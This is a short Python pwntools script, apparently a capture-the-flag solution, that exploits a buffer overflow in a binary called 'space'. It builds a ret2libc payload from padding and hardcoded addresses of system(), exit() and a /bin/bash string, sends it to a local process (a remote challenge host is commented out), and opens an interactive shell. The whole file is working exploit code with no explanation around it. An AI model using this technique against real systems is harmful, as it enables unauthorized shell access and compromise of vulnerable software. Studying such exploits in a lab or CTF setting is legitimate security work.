#!/bin/python
from pwn import *
import struct
import sys

#sh = remote('178.62.0.100', 31094)
sh = process('./space')

libc_base = struct.pack("I", 0xf7d40df0)
padding = 'A' * 18
print_addr = struct.pack("I", 0xf7e20f30)
system_addr = struct.pack("I", 0xf7e11f10)
bash_addr = struct.pack("I", 0xffffdf76)
exit_addr = struct.pack("I", 0xf7e04860)
buf = flat([padding + system_addr + exit_addr + bash_addr])

#padding + addr of system() + addr of exit() + addr to /bin/bash

with open("payload", "wb") as f:
	f.write(buf)

sh.sendlineafter('> ', buf)
sh.interactive()
